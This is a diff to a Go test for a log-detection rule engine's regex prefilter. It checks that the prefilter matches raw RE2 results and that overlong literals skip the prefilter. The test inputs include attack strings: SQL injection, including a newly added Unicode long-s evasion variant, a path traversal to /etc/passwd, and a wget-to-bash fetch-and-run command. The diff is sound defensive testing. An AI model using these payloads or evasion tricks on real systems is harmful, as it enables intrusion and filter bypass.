@@ -650,6 +650,7 @@ func TestRuleLiteralPrefilterMatchesRawRE2Soundness(t *testing.T) {
 		"GET /healthz 200 1.2ms from 10.0.1.4",
 		"FAILED PASSWORD for root from 198.51.100.1",
 		"GET /api?id=1' UnIoN   SeLeCt 1--",
+		"GET /api?id=1' union \u017felect 1--", // Unicode long-s U+017F folds to 's' under (?i)
 		"GET /static/%2E%2e/etc/passwd",
 		"COMMAND=/bin/sh -c WGET http://198.51.100.1/x | BASH",
 		"ba",
@@ -674,5 +675,12 @@ func TestRuleLiteralPrefilterMatchesRawRE2Soundness(t *testing.T) {
 					cr.rule.ID, msg, got[cr.rule.ID], want, cr.anyOfLower)
 			}
 		}
+	}
+
+	// Pathological long custom literal (> maxPrefilterLiteralBytes) must bypass prefilter
+	// and fall back directly to Go RE2 linear-time matching without quadratic substring scanning.
+	longPattern := strings.Repeat("a", maxPrefilterLiteralBytes+32) + "b"
+	if lits := extractRequiredASCIILiterals(longPattern); lits != nil {
+		t.Fatalf("expected long literal pattern (%d bytes) to bypass prefilter, got %v", len(longPattern), lits)
 	}
 }
